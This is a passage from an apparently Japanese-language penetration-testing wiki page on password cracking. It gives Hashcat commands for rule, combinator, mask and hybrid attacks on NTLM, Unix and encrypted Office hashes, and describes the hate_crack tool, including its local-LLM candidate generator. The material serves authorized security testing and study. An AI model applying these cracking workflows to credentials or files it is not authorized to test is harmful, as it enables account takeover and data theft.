hashcat.exe -a 0 -m 1000 C:\Temp\ntlm.txt .\rockyou.txt -r rules\best64.rule
```

#### ルールファイルの説明とプロファイリング

Hashcatのルールは、opcodeを左から右へ実行します。操作が位置0に作用するときは読み違えやすくなります。`^e ^h ^t` は最初に `e`、次に `h`、最後に `t` を先頭に追加するため、`password` は `thepassword` に変わります。置換は大文字と小文字を区別するバイト比較なので、`sa@` のようなルールは大文字の `A` には何も作用しません。見慣れないルールを使う際は、GPUで処理する前に、小文字・大文字・大小混在の代表的なベースワードでテストしてください。<sup>[[6]](#references)[[9]](#references)</sup>

[HashcatRosetta](https://github.com/bandrel/HashcatRosetta) は、各中間候補を表示し、ルールファイル全体のopcode分布を要約できます。opcodeの静的な件数から、そのファイルが主に文字の追加、先頭への追加、置換、切り詰めのどれを行うかが分かります。ルールがパスワードをcrackできると証明するものではありませんが、標的集団で確認されたパスワードパターンに合うルールセットを選ぶ助けになります。<sup>[[6]](#references)[[9]](#references)</sup>

```bash
uv tool install git+https://github.com/bandrel/HashcatRosetta.git
hashcat-rosetta --explain '^e ^h ^t' --baseword password
hashcat-rosetta rules.rule --analyze-rules
```

#### debug logsで冗長なルールを減らす

Hashcatのdebug modeは、ルールによる変換を通常のステータスおよび結果出力とは別に記録します。モード`4`では`baseword:rule:candidate`を出力し、モード`5`では元のwordlistを追加します。`--debug-file`は必ず明示的に指定してください。指定しない場合、Hashcatはプロファイルディレクトリ内の`hashcat.debugfile`を開きます。また、stdoutをリダイレクトしても、これらの記録ではなくコンソール出力が取得されます。debug fileは追記モードで開かれるため、新しい測定の前に古いファイルを削除またはローテーションし、平文のbasewordとcandidateが含まれるため適切に保護してください。<sup>[[7]](#references)[[8]](#references)[[9]](#references)</sup>

```bash
rm -f debug.txt
hashcat -m 1000 -a 0 --debug-mode 5 --debug-file debug.txt \
  -r rules.rule hashes.txt wordlist.txt
hashcat-rosetta debug.txt --rules --metric candidates --top 25
hashcat-rosetta debug.txt --basewords --detail
hashcat-rosetta debug.txt --wordlists --detail
hashcat-rosetta debug.txt --export report.json --format json
```

`frequency`を使って最も頻繁に適用されるルールを調べ、`basewords`で異なる入力のカバー範囲を測定し、`candidates`で異なる出力の数を数えます。ルールが頻繁に適用されても、多くの入力が重複する候補にまとめられることがあるため、候補の順位付けから始めて削減するのが通常は最適です。価値の高いルールを小さなファイルにコピーし、残りのハッシュに対して再実行して、実行ごとのレポートを比較します。モード `5`では、各ソースwordlistが有用なbasewordsを提供しているかどうかも確認できます。データにコロンが含まれていて自動判定が曖昧になる場合は、`--debug-mode 4`または`--debug-mode 5`で強制的に解析します。<sup>[[6]](#references)[[9]](#references)</sup>

- **Wordlist combinator** attack

hashcatを使うと、**2つのwordlistを1つに結合**できます。\
リスト1に **"hello"** という単語が含まれ、2つ目のリストに **"world"** と **"earth"** という単語がそれぞれ1行ずつ含まれているとします。`helloworld`と`helloearth`が生成されます。

```bash
# This will combine 2 wordlists
hashcat.exe -a 1 -m 1000 C:\Temp\ntlm.txt .\wordlist1.txt .\wordlist2.txt

# Same attack as before but adding chars in the newly generated words
# In the previous example this will generate:
## hello-world!
## hello-earth!
hashcat.exe -a 1 -m 1000 C:\Temp\ntlm.txt .\wordlist1.txt .\wordlist2.txt -j $- -k $!
```

#### Grammar-driven combinator attacks（暗号化された Office の例）

既知の文法に従うパスワードは、長く複数の文字種を含んでいても、**実効的な探索空間**が小さい場合があります。認可された評価で入手した暗号化 Office ドキュメントに対して、`office2john.py` はパスワード検証レコードを抽出します。これにより、オンラインでのロックアウト、レート制限、MFA を気にせず、ローカルで推測を実行できます。ドキュメントの暗号化を回避するものではありません。<sup>[[2]](#references)[[5]](#references)</sup>

John が先頭に付加するファイル名フィールドを削除し、Hashcat に検証データだけを渡します。<sup>[[2]](#references)</sup>

```bash
python3 /path/to/office2john.py secrets.xlsx | sed 's/^[^:]*://' > office.hash
head -c 40 office.hash; echo
```

抽出した prefix に基づいて `-m` を選択し、ファイル拡張子から判断しないでください。Hashcat では、`$office$*2007*`、`$office$*2010*`、`$office$*2013*` はそれぞれモード `9400`、`9500`、`9600` に対応します。従来の `$oldoffice$0/$1` および `$oldoffice$3/$4` レコードには、それぞれモード `9700` および `9800` を使用します。<sup>[[3]](#references)</sup>

パスワードの再利用、ポリシー、ヒント、またはユーザーをよく知る人物から得た情報により、`<word><number><optional !><word>` のような文法が判明した場合は、独立して列挙できる prefix を左側の辞書として用意します。この例では数字の `0` から `99` までを試します。範囲や変換方法は、評価で得られた証拠に合わせて変更してください。<sup>[[5]](#references)</sup>

```bash
while IFS= read -r word; do
  for number in $(seq 0 99); do
    printf '%s%s\n%s%s!\n' "$word" "$number" "$word" "$number"
  done
done < words.txt > wordsAndNumbers.txt
```

Hashcat の attack mode `1` は、右側の辞書の各行を左側の辞書の各行に追加するため、`L` 行と `R` 行を含むファイルからは、適用する rules の前に `L × R` 個の候補が生成されます。次のコマンドは、旧形式の `$oldoffice$3/$4` レコード専用です。ほかの Office 形式では mode を変更してください。<sup>[[3]](#references)[[4]](#references)[[5]](#references)</sup>

```bash
hashcat -m 9800 -a 1 office.hash wordsAndNumbers.txt english-88k-upper.txt
```

この前処理パターンは、オフラインで検証可能な他の形式にも応用できます。名目上の全長を総当たりするのではなく、1つのコンポーネントについて妥当な大文字・小文字、日付、区切り文字、数字、句読点のみを列挙し、残りのコンポーネントと組み合わせます。<sup>[[4]](#references)[[5]](#references)</sup>

- **Mask attack** (`-a 3`)

```bash
# Mask attack with simple mask
hashcat.exe -a 3 -m 1000 C:\Temp\ntlm.txt ?u?l?l?l?l?l?l?l?d

hashcat --help #will show the charsets and are as follows
? | Charset
===+=========
l | abcdefghijklmnopqrstuvwxyz
u | ABCDEFGHIJKLMNOPQRSTUVWXYZ
d | 0123456789
h | 0123456789abcdef
H | 0123456789ABCDEF
s | !"#$%&'()*+,-./:;<=>?@[\]^_`{|}~
a | ?l?u?d?s
b | 0x00 - 0xff

# Mask attack declaring custom charset
hashcat.exe -a 3 -m 1000 C:\Temp\ntlm.txt -1 ?d?s ?u?l?l?l?l?l?l?l?1
## -1 ?d?s defines a custom charset (digits and specials).
## ?u?l?l?l?l?l?l?l?1 is the mask, where "?1" is the custom charset.

# Mask attack with variable password length
## Create a file called masks.hcmask with this content:
?d?s,?u?l?l?l?l?1
?d?s,?u?l?l?l?l?l?1
?d?s,?u?l?l?l?l?l?l?1
?d?s,?u?l?l?l?l?l?l?l?1
?d?s,?u?l?l?l?l?l?l?l?l?1
## Use it to crack the password
hashcat.exe -a 3 -m 1000 C:\Temp\ntlm.txt .\masks.hcmask
```

#### 実行前に `.hcmask` ファイルを検証する

不正な行は有効なマスクに紛れて見落とされることがあるため、攻撃を開始する前にファイル全体と推定 keyspace を検証してください。HashcatRosetta はエラーのある行を報告し、マスクが1つでも無効な場合はゼロ以外のステータスを返すため、スクリプトや CI でのチェックに適しています。<sup>[[6]](#references)[[9]](#references)</sup>

```bash
hashcat-rosetta masks.hcmask --verify-masks
```

汎用的なCSVパーサーやテキストパーサーでマスクファイルを正規化しないでください。Hashcatはカスタム文字セット`?1`から`?8`をサポートし、`#`を先頭バイトの場合にのみコメントとして扱い、`?`トークンを解釈する前に、バックスラッシュによるエスケープを1回のパスで取り除きます。そのため、`#`の前に空白がある場合、その空白はマスクデータとして扱われ、エスケープによって、あるシーケンスがリテラルになるか文字セットトークンになるかが変わることがあります。<sup>[[6]](#references)[[9]](#references)</sup>

- Wordlist + Mask（`-a 6`）/ Mask + Wordlist（`-a 7`）攻撃

```bash
# Mask numbers will be appended to each word in the wordlist
hashcat.exe -a 6 -m 1000 C:\Temp\ntlm.txt \wordlist.txt ?d?d?d?d

# Mask numbers will be prepended to each word in the wordlist
hashcat.exe -a 7 -m 1000 C:\Temp\ntlm.txt ?d?d?d?d \wordlist.txt
```

#### hate_crackを使ったターゲット向けHashcatパス

[hate_crack](https://github.com/trustedsec/hate_crack)は、ハッシュファイルを用意し、Hashcatのモードが分かっている場合に、ローカルでのHashcatパスをオーケストレーションします。Hashcat自体は別途インストールする必要があります。サブモジュールを含めてcloneし、`make`を実行してから、対話型セッションを開始します。例のモード`1000`はNTLM用であり、常に使えるデフォルトではありません。既存のcloneでは、PCFGおよびPRINCE-LINGオプションを使う前に`git submodule update --init --recursive`を実行してください。<sup>[[13]](#references)[[14]](#references)</sup>

```bash
git clone --recurse-submodules https://github.com/trustedsec/hate_crack.git
cd hate_crack
make
hate_crack hashes.txt 1000
```

**復元した平文から文法を学習する。** まず辞書／ルールの初期パスを実行し、その後、対象に関連する平文を使って `pcfg_cracker` を学習させます。`config.json` の `pcfgRuleset` に学習済みルールセットを指定し、PCFG（メニュー `20`）を選んで、可能性の高い構造を Hashcat にストリーミングするか、PRINCE-LING（`21`）を選んで、文法に基づく PRINCE のベースリストを作成します。2つの生成器の候補数は `pcfgMaxCandidates` と `pcfgPrinceLingMaxCandidates` で制限します。hate_crack は文法を自動で学習しません。PCFG は、[combinator example](#grammar-driven-combinator-attacks-encrypted-office-example) の固定文法とは異なり、基本語に数字や記号を付けるなどの構造の確率を学習します。<sup>[[10]](#references)[[13]](#references)[[14]](#references)</sup>

```bash
cd pcfg_cracker
python3 trainer.py -t ../target-plaintexts.txt -r TARGET
cd ..
# Set pcfgRuleset to TARGET in config.json, then select 20 or 21.
hate_crack hashes.txt 1000
```

**既知のパスワードからルールを逆算する。** Spoonman（メニュー `22`）は、現在のセッションの空でない `.out` ファイルを含む平文コーパスを取り込み、観測されたパスワードを再現する小文字の baseword と Hashcat ルールを導出します。コーパス内のパスワードを再現する数でルールを順位付けします。まずカバー率上位50%の層から始め、追加の keyspace が妥当な場合にのみ範囲を広げます。変異ではなく stem の不足がカバー率を制限している場合は、導出した baseword を他の関連するワードリストと組み合わせます。Hashcat のルールで使える関数は最大31個で、位置指定用のアルファベットが扱えるインデックスは `0`〜`35` です。パスワードをエンコードできない場合、Spoonman はそのパスワードをリテラルの baseword と no-op ルールで処理します。非常に大きなコーパスでは、上限付きメモリーカウンターの上限に達することがあるため、完全に再現できたと決めつけず、報告されたカバー率を確認してください。出力を単独で再利用する前に、[Hashcat のルールの動作](#explain-and-profile-rule-files)を確認してください。<sup>[[12]](#references)[[13]](#references)[[14]](#references)</sup>

**利用可能な情報に合わせて生成器を選ぶ。** OMEN（`13`）はパスワードリストから文字遷移モデルを学習し、確率順に候補を列挙します。候補数は `omenMaxCandidates` で制限されます。Markov brute force（`15`）では、現在の `.out` にあるクラック結果または選択したリストから `.hcstat2` テーブルを作成し、長さの範囲を指定して順次試行できます。標的に関する情報がパスワードではなく文章の場合、N-gram（`16`）は gzip 入力を含むコーパスを `ngramX.bin` に渡します。デフォルトのグループサイズは3です。これらはそれぞれ異なる方法であり、同じ候補リストを3つ作るわけではありません。<sup>[[11]](#references)[[13]](#references)[[14]](#references)</sup>

**小規模で可能性の高い候補群だけを拡張する。** Permutation（`17`）は入力語のすべての文字を並べ替えるため、8文字の語が1つあるだけでも `8!` 通りになります。Combipow（`19`）は、短いパスフレーズの語群から空でない部分集合の組み合わせを出力します。`-s` はスペースを挿入し、入力行が64行以上の場合はツールが拒否します。Combinator（`6`）は `--sepFill` を使って複数のワードリストを区切り文字で連結できます。通常の2リスト連結は、前述の[Hashcat ネイティブの combinator](#hashcat-attacks)で行えます。<sup>[[13]](#references)[[14]](#references)</sup>

**フィードバック攻撃の実行コストを管理する。** Fingerprint（`5`）は、毎回コーパス全体を再展開するのではなく、新たにクラックされたパスワードをフラグメント長を増やしながら反復的に展開します。組み合わせの keyspace がしきい値を超えると、大きすぎる `-a 1` の処理をスキップします。Hybrid（`7`）は、より広範な `?a` の前置・後置マスクを試す前に、より低コストな `?s?d` の装飾を試します。実行時間は `hcatHybridMaxRuntime` で制限されます。ハイブリッド処理のコストはワードリストのサイズとマスクの空間の積で決まるため、大きなリストに広範なマスクを適用すると、初期の処理を大幅に上回ることがあります。<sup>[[13]](#references)[[14]](#references)</sup>

**ローカル LLM で、復元したパスワードから候補を生成する。** 初回の処理で空でない `<hashfile>.out` が生成された後、hate_crack の LLM attack（メインメニュー `12`、**Cracked passwords** サブメニュー `3`）は、標的に固有の baseword、年、接尾辞、大文字・小文字のパターンを推測し、新しい候補を Hashcat に渡します。小規模なコーパスでは復元した平文をモデルのプロンプトに含められますが、大規模なコーパスは統計情報に要約されます。これは、上記の固定された[ルール](#explain-and-profile-rule-files)や[マスク](#hashcat-attacks)を単に再利用するのではなく、観測されたパターンを一般化する方法です。<sup>[[13]](#references)[[14]](#references)</sup>

hate_crack の `.env` で、すでに提供されているローカル Ollama モデルを設定してください。モデルは自動でダウンロードされません。`OLLAMA_NO_CLOUD=true` にすると、cloud タグ付きモデルと外部のエンドポイントアドレスが拒否されます。ただし、localhost のエンドポイントを指定するだけでは不十分です。Ollama が `-cloud` モデルをリモートでプロキシする場合があり、プロンプトに復元した平文やコーパスの統計情報が含まれることもあります。この設定でもプライベートネットワーク上のエンドポイントは許可され、通信経路上のプロキシの存在も排除できません。そのため、クライアントのデータを送信する前に、推論処理の経路を確認してください。<sup>[[13]](#references)[[14]](#references)[[15]](#references)</sup>

```dotenv
LLM_BACKEND=ollama
OLLAMA_HOST=localhost:11434
OLLAMA_MODEL=qwen3:4b-instruct
OLLAMA_NO_CLOUD=true
```

```bash
hate_crack hashes.txt 1000
# Select 12 (LLM Attack), then 3 (Cracked passwords).
```

より大きな予算を割り当てる前に、候補の成果を、より低コストなrule、mask、およびターゲット学習済みの実行と比較してください。モデルが推測候補を生成し、Hashcatがそれらをハッシュと照合します。<sup>[[13]](#references)[[14]](#references)</sup>

#### Hashcatモード

```bash
hashcat --example-hashes | grep -B1 -A2 "NTLM"
```

LinuxのハッシュをCrackingする - /etc/shadowファイル

```
 500 | md5crypt $1$, MD5(Unix)                          | Operating-Systems
3200 | bcrypt $2*$, Blowfish(Unix)                      | Operating-Systems
7400 | sha256crypt $5$, SHA256(Unix)                    | Operating-Systems
1800 | sha512crypt $6$, SHA512(Unix)                    | Operating-Systems
```

Windowsハッシュのクラッキング

```
3000 | LM                                               | Operating-Systems
1000 | NTLM                                             | Operating-Systems
```

一般的なアプリケーションのハッシュのクラック

```
  900 | MD4                                              | Raw Hash
    0 | MD5                                              | Raw Hash
 5100 | Half MD5                                         | Raw Hash
  100 | SHA1                                             | Raw Hash
10800 | SHA-384                                          | Raw Hash
 1400 | SHA-256                                          | Raw Hash
 1700 | SHA-512                                          | Raw Hash
```

## References

- [1] [GoBruteforcerの内部：AI生成のサーバー既定設定、脆弱なパスワード、暗号資産に特化したキャンペーン](https://research.checkpoint.com/2026/inside-gobruteforcer-ai-generated-server-defaults-weak-passwords-and-crypto-focused-campaigns/)
- [2] [John the Ripper: `office2john.py`](https://github.com/openwall/john/blob/bleeding-jumbo/run/office2john.py)
- [3] [HashcatのサンプルハッシュとMicrosoft Officeのモード](https://hashcat.net/wiki/doku.php?id=example_hashes)
- [4] [Hashcatのコンビネーター攻撃](https://hashcat.net/wiki/doku.php?id=combinator_attack)
- [5] [認証情報のエステートプランニング](https://pentestpartners.com/security-blog/estate-planning-of-credentials)
- [6] [HashcatRosettaリポジトリ](https://github.com/bandrel/HashcatRosetta)
- [7] [Hashcatのデバッグファイル実装](https://github.com/hashcat/hashcat/blob/master/src/debugfile.c)
- [8] [Hashcatのコマンドラインヘルプ](https://github.com/hashcat/hashcat/blob/master/docs/hashcat-help.md)
- [9] [HashcatRosetta：パスワードクラッキングのロゼッタストーンを読み解く](https://trustedsec.com/blog/hashcatrosetta-reading-the-rosetta-stone-of-password-cracking)
- [10] [PCFG Crackerのリポジトリと使い方](https://github.com/lakiw/pcfg_cracker)
- [11] [OMENのリポジトリとユーザーガイド](https://github.com/RUB-SysSec/OMEN)
- [12] [Spoonmanの元のissueとルール導出の設計](https://github.com/trustedsec/hate_crack/issues/169)
- [13] [hate_crackのリポジトリと攻撃に関するドキュメント](https://github.com/trustedsec/hate_crack)
- [14] [hate_crack 2.0以降の新機能](https://trustedsec.com/blog/whats-new-in-hate-crack-since-2-0)
- [15] [hate_crackのLLM送信先ポリシー](https://github.com/trustedsec/hate_crack/blob/main/hate_crack/llm.py)
{{#include ../banners/hacktricks-training.md}}
